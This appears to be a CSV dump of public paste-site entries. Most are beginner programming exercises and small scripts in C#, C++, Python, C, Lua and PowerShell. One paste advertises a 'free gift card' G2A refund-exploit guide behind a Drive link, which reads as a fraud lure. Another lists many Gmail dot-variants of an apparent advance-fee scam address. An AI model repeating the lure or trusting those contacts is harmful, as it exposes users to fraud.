id,title,username,language,date,content
gM8zSSma,Untitled,BobbyGeorgiev,C#,Saturday 2nd of March 2024 12:02:03 PM CDT,"string text = Console.ReadLine();


int countLower = 0;
int countUpper = 0;
int countWhiteSpace = 0;


for  (int i = 0; i < text.Length; i++)
{
    char currentChar = text[i];
    if (Char.IsUpper(currentChar))
    {
        countUpper++;
    }
    else if (Char.IsLower(currentChar))
    {
        countLower++;
    }
    else if (Char.IsWhiteSpace(currentChar))  
    { 
        countWhiteSpace++; 
    }
}
Console.WriteLine(countUpper);
Console.WriteLine(countLower);
Console.WriteLine(countWhiteSpace);"
d7CKTF9d,G2A.com Free Gift Card Guide Mar 2024,ounnuo,GetText,Saturday 2nd of March 2024 11:48:08 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_825815.pdf

Working as of:
02 March 2024"
pJnmbF0N,Untitled,Josif_tepe,C++,Saturday 2nd of March 2024 11:46:00 AM CDT,"#include <iostream>
#include <vector>
using namespace std;
int main() {
    int p, n;
    cin >> p >> n;
    vector<int> v;
    for(int i = 0; i < 100; i++) {
        int tmp = p;
        int treta_cifra = tmp % 10;
        tmp /= 10;
        int vtora_cifra = tmp % 10;
        tmp /= 10;
        int prva_cifra = tmp % 10;
        tmp /= 10;
        int sleden_broj = prva_cifra * prva_cifra + vtora_cifra * vtora_cifra + treta_cifra * treta_cifra;
        
        
        v.push_back(p);
        p = sleden_broj;
        if(i + 1 == n) {
            cout << p << endl;
            return 0;
        }
    }
    vector<int> reps;
    for(int i = 0; i < v.size(); i++) {
        int se_povtoruva = -1;
        for(int j = i + 1; j < v.size(); j++) {
            if(v[i] == v[j]) {
                se_povtoruva = j - 1;
                break;
            }
        }
        if(se_povtoruva != -1) {
            for(int j = i; j <= se_povtoruva; j++) {
                
                reps.push_back(v[j]);
            }
            n -= i;
            break;
        }
    }
    int sz = reps.size();
    if(n % sz == 0) {
        cout << reps[sz - 1] << endl;
    }
    else {
        cout << reps[n % sz] << endl;
    }
    return 0;
}

// 89 145 42 20 4 16 37 58
"
mLh2UC3J,Untitled,h1n0t0r1,Python,Saturday 2nd of March 2024 11:38:18 AM CDT,"# Logic

result = ''

for i in range(10000):
    user_input = float(input())
    if user_input >= 0:

        result += f'Result: {user_input * 2:.2f};'  # Concatenate current result with new result
                                                    # With ; for delimiter
    else:
        result += 'Negative number!'
        break

# Print output
single_results = result.split(';') # Split all the results by delimiter
# single_result is a collection of all results with index and we can iterate this collection
for i in range(len(single_results)):
    print(single_results[i])
                                    
"
RVuVhYnG,VPN COMPOSE,alice_killer,Bash,Saturday 2nd of March 2024 11:31:52 AM CDT,"SUBNET=10.2.0.0/24
UNBOUND_IPV4_ADDRESS=10.2.0.200
PIHOLE_IPV4_ADDRESS=10.2.0.100

1. Set two Pihole DNS - 127.0.0.1, 10.2.0.200
2. SET VPN DNS as Pihole's IP - 10.2.0.100
"
v9dGWsRr,Untitled,h1n0t0r1,Python,Saturday 2nd of March 2024 11:31:30 AM CDT,"

result_list = [] # create empty list

for i in range(10000):
    user_input = float(input())
    if user_input >= 0:
        result_list.append(f'Result: {user_input * 2:.2f}')  # Append result to result list
    else:
        result_list.append('Negative number!')
        break

for i in range(len(result_list)):
    print(result_list[i])"
UzB4kEwJ,"LED animation using micropython, shift registers, and a timer.",lostogre,Python,Saturday 2nd of March 2024 11:29:15 AM CDT,"#              .';:cc;.
#            .,',;lol::c.
#            ;';lddddlclo
#            lcloxxoddodxdool:,.
#            cxdddxdodxdkOkkkkkkkd:.
#          .ldxkkOOOOkkOO000Okkxkkkkx:.
#        .lddxkkOkOOO0OOO0000Okxxxxkkkk:
#       'ooddkkkxxkO0000KK00Okxdoodxkkkko
#      .ooodxkkxxxOO000kkkO0KOxolooxkkxxkl
#      lolodxkkxxkOx,.      .lkdolodkkxxxO.
#      doloodxkkkOk           ....   .,cxO;
#      ddoodddxkkkk:         ,oxxxkOdc'..o'
#      :kdddxxxxd,  ,lolccldxxxkkOOOkkkko,
#       lOkxkkk;  :xkkkkkkkkOOO000OOkkOOk.
#        ;00Ok' 'O000OO0000000000OOOO0Od.
#         .l0l.;OOO000000OOOOOO000000x,
#            .'OKKKK00000000000000kc.
#               .:ox0KKKKKKK0kdc,.
#                      ...
#
# Author: peppe8o
# Blog: https://peppe8o.com
# Date: Aug 26th, 2021
# Version: 1.0

from machine import Pin, Timer
import random

#define PINs according to cabling
dataPIN = 19
latchPIN = 17
clockPIN = 18

#set pins to output PIN objects
dataPIN=Pin(dataPIN, Pin.OUT)
latchPIN=Pin(latchPIN, Pin.OUT)
clockPIN=Pin(clockPIN, Pin.OUT)

bit_string=""0000000000000000""

#define shift register update function
def shift_update(tim):

    # get the previously defined global values.
    global bit_string
    global dataPIN
    global clockPIN
    global latchPIN

    #put latch down to start data sending
    clockPIN.value(0)
    latchPIN.value(0)
    clockPIN.value(1)
  
    #load data in reverse order
    for i in range(15, -1, -1):
        clockPIN.value(0)
        dataPIN.value(int(bit_string[i]))
        clockPIN.value(1)

    #put latch up to store data on register
    clockPIN.value(0)
    latchPIN.value(1)
    clockPIN.value(1)

    bit_string = str(random.randint(0, 1))+bit_string[:-1]

def main():

    #start the timer, calling shift register function as a callback
    Timer(-1).init(period=100, mode=Timer.PERIODIC, callback=shift_update)
    
if __name__==""__main__"":
    main()

"
5HQW5wC1,Net Extender,Alexr360,Lua,Saturday 2nd of March 2024 11:28:56 AM CDT,"-- Initialize modem
local modem = peripheral.find(""modem"")
if not modem then
  print(""No modem found"")
  return
end
modem.open(os.getComputerID()) -- Open modem on computer ID

-- Main loop
while true do
  local event, modemSide, senderChannel, replyChannel, message, distance = os.pullEvent(""modem_message"")
  print(""Received message:"")
  print(""  Sender: "" .. senderChannel)
  print(""  Message: "" .. tostring(message))
end
"
VLwWfm42,Untitled,Josif_tepe,C++,Saturday 2nd of March 2024 11:24:50 AM CDT,"#include <iostream>
#include <cmath>
using namespace std;
int main() {
    int p, n;
    cin >> p >> n;
    
    for(int i = 0; i < n; i++) {
        int tmp = p;
        int treta_cifra = tmp % 10;
        tmp /= 10;
        int vtora_cifra = tmp % 10;
        tmp /= 10;
        int prva_cifra = tmp % 10;
        tmp /= 10;
        int sleden_broj = prva_cifra * prva_cifra + vtora_cifra * vtora_cifra + treta_cifra * treta_cifra;
        
        p = sleden_broj;
    
    }
    cout << p << endl;
    return 0;
}
"
suswTqCt,Untitled,dllbridge,C,Saturday 2nd of March 2024 11:07:55 AM CDT,"

#include   <stdio.h>


char sz[99]; 


////////////////////////////////////////////////////////
int main()
{
	
	for(int i = 0; i < 5; i++)
	{
		
	    sz[i] = 104 + i;	
	}

	printf(sz);   
	
	 	  
return 0;
}
                         















/*


#include   <stdio.h>


char sz[99] = ""SONY""; 


////////////////////////////////////////////////////////
int main()
{
	
	sz[2] = 'Z';

    printf(""sz[0] = %c \n"", sz[0]); 	 
    printf(""sz[1] = %c \n"", sz[1]);   
    printf(""sz[2] = %c \n"", sz[2]); 	 
    printf(""sz[3] = %c \n"", sz[3]); 
    sz[1] = 'b';
	printf(sz);    	  
return 0;
}
                         

*/













/*

#include   <stdio.h>


int n1 = 43,  //  l;k dgkl;  ;kfdlk dgfl;k   
    n2 = 44;  //  lkjkljsdlk klsj fkl jaskldf 
    
char c = '$';   

char sz[99] = ""SONY""; 


////////////////////////////////////////////////////////
int main()
{
	
    
			 	
    printf(""size of c = %d\n"", sizeof(c)); 	
    printf(""        c = %c\n"",        c ); 	
    printf(""       sz = %s\n"",        sz); 	 
    
return 0;
}

*/















/*
#include   <stdio.h>
#include  <locale.h>       //  здесь ""живёт"" setlocale(LC_ALL, ""rus"");

int n1 = 43, 
    n2 = 44;


////////////////////////////////////////////////////////
int main()
{
	
    
			 	
    printf(""n = %d\n"", n1 - n2); 	
  
 
    
return 0;
}
"
S5y9NTsj,classConstructor.ps1,Combreal,PowerShell,Saturday 2nd of March 2024 10:59:49 AM CDT,"Add-Type -TypeDefinition @'
public class DbzCharacter {
    public int Id { get; set; }
    public string Name{ get; set; }
    public int SuperSaiyanLevel { get; set; }
    public string SpecialMove{ get; set; }

    public DbzCharacter(int id, string name, int superSaiyanLevel, string specialMove) {
    this.Id = id;
    this.Name = name;
    this.SuperSaiyanLevel = superSaiyanLevel;
    this.SpecialMove = specialMove;
    }
}
'@

$Person2 = [DbzCharacter]::new(1, ""Goku"", 3, ""Kamehameha"")
$Person3 = [DbzCharacter]::new(2, ""Tony"", 99, ""Montana"")

$Person2
$Person3"
9Z4tMVWt,fflag,AzurEXb,C++,Saturday 2nd of March 2024 10:30:52 AM CDT,"{ ""DFIntGameNetPVHeaderTranslationZeroCutoffExponent"": ""10"" }"
qE9ZEPqH,browseTableValueSQL.ps1,Combreal,PowerShell,Saturday 2nd of March 2024 10:30:27 AM CDT,"#Requieres MySQL Connector NET 8.3.0 and SimplySql Powershell Module

[void][system.reflection.Assembly]::LoadFrom(""C:\Program Files (x86)\MySQL\MySQL Connector NET 8.3.0\MySql.Data.dll"")

$Mysqlhost= ""localhost""
$Mysqluser= ""root""
$Mysqlpass= ""myrootpswd""
$Mysqldatabase= ""mydb""

$Connection = [MySql.Data.MySqlClient.MySqlConnection]@{ConnectionString=""server=$Mysqlhost;uid=$Mysqluser;pwd=$Mysqlpass;database=$Mysqldatabase""}
$Connection.Open()
$sql = New-Object MySql.Data.MySqlClient.MySqlCommand
$sql.Connection = $Connection

$sql.CommandText = ""SELECT title FROM recipes""
$myreader = $sql.ExecuteReader()
while($myreader.Read()) {
    $myreader.GetString(0)
}
$myreader.Close()

$sql.CommandText = ""SELECT full_name FROM users""
$myreader = $sql.ExecuteReader()
while($myreader.Read()) {
    $myreader.GetString(0)
}
$myreader.Close()

$Connection.Close()"
ycpMPY92,Nigerian scammers [2-3-2/2024],bombaires,AIMMS,Saturday 2nd of March 2024 10:21:05 AM CDT,"<a href=""mailto:worldbankcomp893@gmail.com"">worldbankcomp893@gmail.com</a>
<a href=""mailto:wo.r.ldbank.comp8.9.3@gmail.com"">wo.r.ldbank.comp8.9.3@gmail.com</a>
<a href=""mailto:w.or.l.d.ban.kc.omp89.3@gmail.com"">w.or.l.d.ban.kc.omp89.3@gmail.com</a>
<a href=""mailto:w.or.l.d.ba.n.kc.o.mp.89.3@gmail.com"">w.or.l.d.ba.n.kc.o.mp.89.3@gmail.com</a>
<a href=""mailto:w.o.r.l.d.b.a.nkc.omp8.93@gmail.com"">w.o.r.l.d.b.a.nkc.omp8.93@gmail.com</a>
<a href=""mailto:w.o.rldba.nkc.om.p8.93@gmail.com"">w.o.rldba.nkc.om.p8.93@gmail.com</a>
<a href=""mailto:wo.rl.db.ank.co.m.p8.9.3@gmail.com"">wo.rl.db.ank.co.m.p8.9.3@gmail.com</a>
<a href=""mailto:w.orld.ba.nk.co.mp.8.9.3@gmail.com"">w.orld.ba.nk.co.mp.8.9.3@gmail.com</a>
<a href=""mailto:w.o.r.l.d.bank.co.m.p8.93@gmail.com"">w.o.r.l.d.bank.co.m.p8.93@gmail.com</a>
<a href=""mailto:worl.d.ba.n.k.co.m.p89.3@gmail.com"">worl.d.ba.n.k.co.m.p89.3@gmail.com</a>
<a href=""mailto:w.orl.d.bankcom.p893@gmail.com"">w.orl.d.bankcom.p893@gmail.com</a>
<a href=""mailto:wo.rl.d.ban.k.c.o.mp8.93@gmail.com"">wo.rl.d.ban.k.c.o.mp8.93@gmail.com</a>
<a href=""mailto:wo.r.l.d.ba.n.k.co.m.p89.3@gmail.com"">wo.r.l.d.ba.n.k.co.m.p89.3@gmail.com</a>
<a href=""mailto:w.or.ld.b.ankc.omp8.9.3@gmail.com"">w.or.ld.b.ankc.omp8.9.3@gmail.com</a>
<a href=""mailto:w.or.ld.ba.nkcom.p.8.93@gmail.com"">w.or.ld.ba.nkcom.p.8.93@gmail.com</a>
<a href=""mailto:wor.ldb.a.nk.comp.89.3@gmail.com"">wor.ldb.a.nk.comp.89.3@gmail.com</a>
<a href=""mailto:w.o.rl.dbankco.m.p8.93@gmail.com"">w.o.rl.dbankco.m.p8.93@gmail.com</a>
<a href=""mailto:wor.ldb.ank.com.p.893@gmail.com"">wor.ldb.ank.com.p.893@gmail.com</a>
<a href=""mailto:worl.d.ba.n.k.c.om.p8.93@gmail.com"">worl.d.ba.n.k.c.om.p8.93@gmail.com</a>
<a href=""mailto:w.o.rl.dbank.com.p8.93@gmail.com"">w.o.rl.dbank.com.p8.93@gmail.com</a>
<a href=""mailto:w.o.rldb.ankco.m.p89.3@gmail.com"">w.o.rldb.ankco.m.p89.3@gmail.com</a>
<a href=""mailto:worldb.ankc.o.m.p89.3@gmail.com"">worldb.ankc.o.m.p89.3@gmail.com</a>
<a href=""mailto:w.orl.d.bank.c.om.p89.3@gmail.com"">w.orl.d.bank.c.om.p89.3@gmail.com</a>
<a href=""mailto:w.or.l.db.an.kcom.p.8.9.3@gmail.com"">w.or.l.db.an.kcom.p.8.9.3@gmail.com</a>
<a href=""mailto:w.orld.b.a.nk.com.p893@gmail.com"">w.orld.b.a.nk.com.p893@gmail.com</a>
<a href=""mailto:w.o.rld.ba.n.k.co.m.p.8.9.3@gmail.com"">w.o.rld.ba.n.k.co.m.p.8.9.3@gmail.com</a>
<a href=""mailto:wor.l.db.a.nk.comp893@gmail.com"">wor.l.db.a.nk.comp893@gmail.com</a>
<a href=""mailto:worl.d.bank.com.p.8.93@gmail.com"">worl.d.bank.com.p.8.93@gmail.com</a>
<a href=""mailto:w.or.ldban.kco.m.p.8.93@gmail.com"">w.or.ldban.kco.m.p.8.93@gmail.com</a>
<a href=""mailto:wor.l.db.a.n.kc.omp.8.9.3@gmail.com"">wor.l.db.a.n.kc.omp.8.9.3@gmail.com</a>
<a href=""mailto:wo.rld.b.an.k.c.om.p.89.3@gmail.com"">wo.rld.b.an.k.c.om.p.89.3@gmail.com</a>
<a href=""mailto:wo.rldba.nk.c.o.m.p.8.93@gmail.com"">wo.rldba.nk.c.o.m.p.8.93@gmail.com</a>
<a href=""mailto:worl.dba.n.k.c.omp.8.93@gmail.com"">worl.dba.n.k.c.omp.8.93@gmail.com</a>
<a href=""mailto:w.o.r.ldban.kc.om.p.893@gmail.com"">w.o.r.ldban.kc.om.p.893@gmail.com</a>
<a href=""mailto:worl.d.b.a.n.kcom.p8.93@gmail.com"">worl.d.b.a.n.kcom.p8.93@gmail.com</a>
<a href=""mailto:w.orl.db.a.nk.c.omp8.93@gmail.com"">w.orl.db.a.nk.c.omp8.93@gmail.com</a>
<a href=""mailto:wor.ldb.a.n.k.comp.893@gmail.com"">wor.ldb.a.n.k.comp.893@gmail.com</a>
<a href=""mailto:w.o.rl.d.b.a.nk.co.mp.89.3@gmail.com"">w.o.rl.d.b.a.nk.co.mp.89.3@gmail.com</a>
<a href=""mailto:w.or.l.db.a.nk.co.mp.89.3@gmail.com"">w.or.l.db.a.nk.co.mp.89.3@gmail.com</a>
<a href=""mailto:wo.r.l.db.an.kc.om.p.8.9.3@gmail.com"">wo.r.l.db.an.kc.om.p.8.9.3@gmail.com</a>
<a href=""mailto:w.or.ldb.ank.c.omp.8.9.3@gmail.com"">w.or.ldb.ank.c.omp.8.9.3@gmail.com</a>
<a href=""mailto:w.o.rld.b.a.nkcomp893@gmail.com"">w.o.rld.b.a.nkcomp893@gmail.com</a>
<a href=""mailto:wor.ld.b.a.nkcom.p89.3@gmail.com"">wor.ld.b.a.nkcom.p89.3@gmail.com</a>
<a href=""mailto:w.o.r.l.dba.nk.c.o.mp893@gmail.com"">w.o.r.l.dba.nk.c.o.mp893@gmail.com</a>
<a href=""mailto:world.b.a.nk.c.om.p89.3@gmail.com"">world.b.a.nk.c.om.p89.3@gmail.com</a>
<a href=""mailto:wo.r.ldba.nkc.om.p.89.3@gmail.com"">wo.r.ldba.nkc.om.p.89.3@gmail.com</a>
<a href=""mailto:w.or.ldba.n.kc.o.mp893@gmail.com"">w.or.ldba.n.kc.o.mp893@gmail.com</a>
<a href=""mailto:world.ba.nk.c.om.p.89.3@gmail.com"">world.ba.nk.c.om.p.89.3@gmail.com</a>
<a href=""mailto:w.or.ldb.a.nkcomp.893@gmail.com"">w.or.ldb.a.nkcomp.893@gmail.com</a>
<a href=""mailto:wo.r.l.db.an.kco.mp.89.3@gmail.com"">wo.r.l.db.an.kco.mp.89.3@gmail.com</a>
<a href=""mailto:wo.r.ldb.a.n.kc.omp8.9.3@gmail.com"">wo.r.ldb.a.n.kc.omp8.9.3@gmail.com</a>
<a href=""mailto:wo.rl.d.b.an.k.c.o.mp8.93@gmail.com"">wo.rl.d.b.an.k.c.o.mp8.93@gmail.com</a>
<a href=""mailto:w.orl.d.b.an.k.comp.8.93@gmail.com"">w.orl.d.b.an.k.comp.8.93@gmail.com</a>
<a href=""mailto:wo.rl.d.bankco.m.p.89.3@gmail.com"">wo.rl.d.bankco.m.p.89.3@gmail.com</a>
<a href=""mailto:wo.rldb.a.nkc.o.mp89.3@gmail.com"">wo.rldb.a.nkc.o.mp89.3@gmail.com</a>
<a href=""mailto:wo.rl.db.a.n.kcomp89.3@gmail.com"">wo.rl.db.a.n.kcomp89.3@gmail.com</a>
<a href=""mailto:w.o.r.l.dbank.com.p893@gmail.com"">w.o.r.l.dbank.com.p893@gmail.com</a>
<a href=""mailto:world.b.a.n.k.c.om.p.89.3@gmail.com"">world.b.a.n.k.c.om.p.89.3@gmail.com</a>
<a href=""mailto:world.b.an.kc.om.p.8.93@gmail.com"">world.b.an.kc.om.p.8.93@gmail.com</a>
<a href=""mailto:w.o.r.l.dba.n.kc.o.mp893@gmail.com"">w.o.r.l.dba.n.kc.o.mp893@gmail.com</a>
<a href=""mailto:wo.rld.b.ankcom.p.893@gmail.com"">wo.rld.b.ankcom.p.893@gmail.com</a>
<a href=""mailto:wo.r.l.db.a.nkc.om.p893@gmail.com"">wo.r.l.db.a.nkc.om.p893@gmail.com</a>
<a href=""mailto:w.o.rldbankco.mp8.93@gmail.com"">w.o.rldbankco.mp8.93@gmail.com</a>
<a href=""mailto:wor.ldba.nkco.m.p893@gmail.com"">wor.ldba.nkco.m.p893@gmail.com</a>
<a href=""mailto:worl.db.ankcomp.8.93@gmail.com"">worl.db.ankcomp.8.93@gmail.com</a>
<a href=""mailto:w.o.r.l.d.b.a.n.kco.mp.893@gmail.com"">w.o.r.l.d.b.a.n.kco.mp.893@gmail.com</a>
<a href=""mailto:w.o.r.ld.b.a.n.k.c.o.mp.89.3@gmail.com"">w.o.r.ld.b.a.n.k.c.o.mp.89.3@gmail.com</a>
<a href=""mailto:w.orl.d.ba.n.kc.o.mp89.3@gmail.com"">w.orl.d.ba.n.kc.o.mp89.3@gmail.com</a>
<a href=""mailto:worldban.k.c.o.m.p893@gmail.com"">worldban.k.c.o.m.p893@gmail.com</a>
<a href=""mailto:w.orl.d.b.an.k.co.mp.89.3@gmail.com"">w.orl.d.b.an.k.co.mp.89.3@gmail.com</a>
<a href=""mailto:wo.rldb.an.k.c.o.mp.8.93@gmail.com"">wo.rldb.an.k.c.o.mp.8.93@gmail.com</a>
<a href=""mailto:worl.dban.k.c.o.mp8.93@gmail.com"">worl.dban.k.c.o.mp8.93@gmail.com</a>
<a href=""mailto:wo.r.l.d.ba.nkc.o.mp.893@gmail.com"">wo.r.l.d.ba.nkc.o.mp.893@gmail.com</a>
<a href=""mailto:w.or.l.d.ba.n.k.c.om.p.8.9.3@gmail.com"">w.or.l.d.ba.n.k.c.om.p.8.9.3@gmail.com</a>
<a href=""mailto:w.o.r.ld.b.an.kc.o.mp8.93@gmail.com"">w.o.r.ld.b.an.kc.o.mp8.93@gmail.com</a>
<a href=""mailto:worldba.nk.c.omp.893@gmail.com"">worldba.nk.c.omp.893@gmail.com</a>
<a href=""mailto:worldb.a.nk.c.o.m.p.8.9.3@gmail.com"">worldb.a.nk.c.o.m.p.8.9.3@gmail.com</a>
<a href=""mailto:worl.dban.kcom.p8.93@gmail.com"">worl.dban.kcom.p8.93@gmail.com</a>
<a href=""mailto:w.o.rl.d.b.ankc.o.mp89.3@gmail.com"">w.o.rl.d.b.ankc.o.mp89.3@gmail.com</a>
<a href=""mailto:w.o.r.l.dba.nk.c.o.mp.893@gmail.com"">w.o.r.l.dba.nk.c.o.mp.893@gmail.com</a>
<a href=""mailto:w.o.rl.d.b.a.n.kc.o.mp.8.9.3@gmail.com"">w.o.rl.d.b.a.n.kc.o.mp.8.9.3@gmail.com</a>
<a href=""mailto:w.orldb.an.k.c.omp8.9.3@gmail.com"">w.orldb.an.k.c.omp8.9.3@gmail.com</a>
<a href=""mailto:w.orl.d.b.an.kcomp.8.93@gmail.com"">w.orl.d.b.an.kcomp.8.93@gmail.com</a>
<a href=""mailto:w.orl.db.an.kcom.p8.9.3@gmail.com"">w.orl.db.an.kcom.p8.9.3@gmail.com</a>
<a href=""mailto:worl.d.bankc.om.p8.9.3@gmail.com"">worl.d.bankc.om.p8.9.3@gmail.com</a>
<a href=""mailto:w.o.r.ldba.n.kco.m.p.8.9.3@gmail.com"">w.o.r.ldba.n.kco.m.p.8.9.3@gmail.com</a>
<a href=""mailto:w.o.r.ld.b.a.n.k.co.m.p.893@gmail.com"">w.o.r.ld.b.a.n.k.co.m.p.893@gmail.com</a>
<a href=""mailto:wor.ldba.nkc.om.p893@gmail.com"">wor.ldba.nkc.om.p893@gmail.com</a>
<a href=""mailto:w.orldba.nk.comp89.3@gmail.com"">w.orldba.nk.comp89.3@gmail.com</a>
<a href=""mailto:wor.l.d.b.ankc.omp893@gmail.com"">wor.l.d.b.ankc.omp893@gmail.com</a>
<a href=""mailto:wor.ld.b.an.kc.o.m.p8.93@gmail.com"">wor.ld.b.an.kc.o.m.p8.93@gmail.com</a>
<a href=""mailto:w.orl.d.ba.n.kcom.p.89.3@gmail.com"">w.orl.d.ba.n.kcom.p.89.3@gmail.com</a>
<a href=""mailto:wor.ldba.nk.c.omp.8.93@gmail.com"">wor.ldba.nk.c.omp.8.93@gmail.com</a>
<a href=""mailto:w.o.rld.bank.com.p.89.3@gmail.com"">w.o.rld.bank.com.p.89.3@gmail.com</a>
<a href=""mailto:w.or.ld.b.a.n.k.com.p8.93@gmail.com"">w.or.ld.b.a.n.k.com.p8.93@gmail.com</a>
<a href=""mailto:w.orld.b.a.n.kc.o.mp.893@gmail.com"">w.orld.b.a.n.kc.o.mp.893@gmail.com</a>
<a href=""mailto:w.o.r.l.d.ban.kcom.p89.3@gmail.com"">w.o.r.l.d.ban.kcom.p89.3@gmail.com</a>
<a href=""mailto:wo.r.l.db.a.n.k.c.o.mp89.3@gmail.com"">wo.r.l.db.a.n.k.c.o.mp89.3@gmail.com</a>
<a href=""mailto:w.or.ld.b.a.nkcomp.8.9.3@gmail.com"">w.or.ld.b.a.nkcomp.8.9.3@gmail.com</a>
<a href=""mailto:w.orl.d.b.ankco.m.p.8.9.3@gmail.com"">w.orl.d.b.ankco.m.p.8.9.3@gmail.com</a>
<a href=""mailto:world.b.an.kcom.p8.9.3@gmail.com"">world.b.an.kcom.p8.9.3@gmail.com</a>
<a href=""mailto:w.o.r.ldban.k.c.om.p893@gmail.com"">w.o.r.ldban.k.c.om.p893@gmail.com</a>
<a href=""mailto:w.orl.db.ankc.omp.89.3@gmail.com"">w.orl.db.ankc.omp.89.3@gmail.com</a>
<a href=""mailto:w.orld.ba.n.kc.omp.8.93@gmail.com"">w.orld.ba.n.kc.omp.8.93@gmail.com</a>
<a href=""mailto:w.o.rld.ba.nk.comp.893@gmail.com"">w.o.rld.ba.nk.comp.893@gmail.com</a>
<a href=""mailto:wor.l.d.ba.n.kc.omp.89.3@gmail.com"">wor.l.d.ba.n.kc.omp.89.3@gmail.com</a>
<a href=""mailto:wo.r.ldban.k.c.om.p.8.93@gmail.com"">wo.r.ldban.k.c.om.p.8.93@gmail.com</a>
<a href=""mailto:w.orl.d.b.a.n.k.com.p8.93@gmail.com"">w.orl.d.b.a.n.k.com.p8.93@gmail.com</a>
<a href=""mailto:w.orl.d.ba.nk.co.mp8.9.3@gmail.com"">w.orl.d.ba.nk.co.mp8.9.3@gmail.com</a>
<a href=""mailto:w.or.l.d.b.a.nkco.m.p.89.3@gmail.com"">w.or.l.d.b.a.nkco.m.p.89.3@gmail.com</a>
<a href=""mailto:w.o.r.l.d.ba.n.k.c.o.m.p89.3@gmail.com"">w.o.r.l.d.ba.n.k.c.o.m.p89.3@gmail.com</a>
<a href=""mailto:w.o.r.ld.ba.nkc.o.mp893@gmail.com"">w.o.r.ld.ba.nkc.o.mp893@gmail.com</a>
<a href=""mailto:wo.r.ld.b.ank.co.mp.8.93@gmail.com"">wo.r.ld.b.ank.co.mp.8.93@gmail.com</a>
<a href=""mailto:wo.r.ld.ban.k.c.o.mp.8.9.3@gmail.com"">wo.r.ld.ban.k.c.o.mp.8.9.3@gmail.com</a>
<a href=""mailto:w.orld.ba.n.k.c.om.p8.93@gmail.com"">w.orld.ba.n.k.c.om.p8.93@gmail.com</a>
<a href=""mailto:w.or.l.db.a.nkcomp89.3@gmail.com"">w.or.l.db.a.nkcomp89.3@gmail.com</a>
<a href=""mailto:w.orldb.an.kc.omp8.93@gmail.com"">w.orldb.an.kc.omp8.93@gmail.com</a>
<a href=""mailto:wo.rld.b.a.nk.co.m.p893@gmail.com"">wo.rld.b.a.nk.co.m.p893@gmail.com</a>
<a href=""mailto:w.orl.d.b.ankc.o.mp.893@gmail.com"">w.orl.d.b.ankc.o.mp.893@gmail.com</a>
<a href=""mailto:w.o.rld.ban.k.comp893@gmail.com"">w.o.rld.ban.k.comp893@gmail.com</a>
<a href=""mailto:w.o.r.ldbank.c.o.m.p.8.9.3@gmail.com"">w.o.r.ldbank.c.o.m.p.8.9.3@gmail.com</a>
<a href=""mailto:world.b.an.kcomp89.3@gmail.com"">world.b.an.kcomp89.3@gmail.com</a>
<a href=""mailto:wor.ldba.n.k.co.mp89.3@gmail.com"">wor.ldba.n.k.co.mp89.3@gmail.com</a>
<a href=""mailto:w.orl.d.b.ankco.m.p.89.3@gmail.com"">w.orl.d.b.ankco.m.p.89.3@gmail.com</a>
<a href=""mailto:wo.rldb.a.n.kc.o.m.p.893@gmail.com"">wo.rldb.a.n.kc.o.m.p.893@gmail.com</a>
<a href=""mailto:w.orl.dbankco.mp.8.9.3@gmail.com"">w.orl.dbankco.mp.8.9.3@gmail.com</a>
<a href=""mailto:wo.r.l.d.b.ankco.m.p.8.9.3@gmail.com"">wo.r.l.d.b.ankco.m.p.8.9.3@gmail.com</a>
<a href=""mailto:wo.rldba.nk.c.om.p8.9.3@gmail.com"">wo.rldba.nk.c.om.p8.9.3@gmail.com</a>
<a href=""mailto:wo.rldban.kcomp893@gmail.com"">wo.rldban.kcomp893@gmail.com</a>
<a href=""mailto:w.o.rldban.k.c.om.p.893@gmail.com"">w.o.rldban.k.c.om.p.893@gmail.com</a>
<a href=""mailto:wo.rl.d.b.ank.com.p89.3@gmail.com"">wo.rl.d.b.ank.com.p89.3@gmail.com</a>
<a href=""mailto:w.o.r.l.db.an.kco.m.p8.9.3@gmail.com"">w.o.r.l.db.an.kco.m.p8.9.3@gmail.com</a>
<a href=""mailto:worldb.ankc.omp.8.93@gmail.com"">worldb.ankc.omp.8.93@gmail.com</a>
<a href=""mailto:w.orl.d.ba.nk.co.m.p89.3@gmail.com"">w.orl.d.ba.nk.co.m.p89.3@gmail.com</a>
<a href=""mailto:wo.r.l.db.a.nkco.mp.89.3@gmail.com"">wo.r.l.db.a.nkco.mp.89.3@gmail.com</a>
<a href=""mailto:w.o.rldb.a.nkcomp8.9.3@gmail.com"">w.o.rldb.a.nkcomp8.9.3@gmail.com</a>
<a href=""mailto:worldb.ank.com.p8.9.3@gmail.com"">worldb.ank.com.p8.9.3@gmail.com</a>
<a href=""mailto:w.orl.d.ba.n.kco.m.p8.9.3@gmail.com"">w.orl.d.ba.n.kco.m.p8.9.3@gmail.com</a>
<a href=""mailto:w.o.r.ldba.nk.co.mp8.93@gmail.com"">w.o.r.ldba.nk.co.mp8.93@gmail.com</a>
<a href=""mailto:wor.ld.ba.nkc.om.p.8.9.3@gmail.com"">wor.ld.ba.nkc.om.p.8.9.3@gmail.com</a>
<a href=""mailto:wor.ld.ba.nk.com.p.8.9.3@gmail.com"">wor.ld.ba.nk.com.p.8.9.3@gmail.com</a>
<a href=""mailto:w.or.ld.bank.c.om.p.8.9.3@gmail.com"">w.or.ld.bank.c.om.p.8.9.3@gmail.com</a>
<a href=""mailto:w.o.r.ld.ban.kco.m.p8.93@gmail.com"">w.o.r.ld.ban.kco.m.p8.93@gmail.com</a>
<a href=""mailto:worl.d.ba.n.k.co.m.p.8.9.3@gmail.com"">worl.d.ba.n.k.co.m.p.8.9.3@gmail.com</a>
<a href=""mailto:w.o.rldba.nkc.om.p.8.9.3@gmail.com"">w.o.rldba.nkc.om.p.8.9.3@gmail.com</a>
<a href=""mailto:wor.l.d.ba.nkc.o.m.p8.93@gmail.com"">wor.l.d.ba.nkc.o.m.p8.93@gmail.com</a>
<a href=""mailto:w.o.rl.db.a.nkco.m.p89.3@gmail.com"">w.o.rl.db.a.nkco.m.p89.3@gmail.com</a>
<a href=""mailto:wor.ldb.a.n.k.c.o.mp89.3@gmail.com"">wor.ldb.a.n.k.c.o.mp89.3@gmail.com</a>
<a href=""mailto:wo.r.l.d.ba.nkco.mp.893@gmail.com"">wo.r.l.d.ba.nkco.mp.893@gmail.com</a>
<a href=""mailto:w.o.rldb.an.k.co.m.p893@gmail.com"">w.o.rldb.an.k.co.m.p893@gmail.com</a>
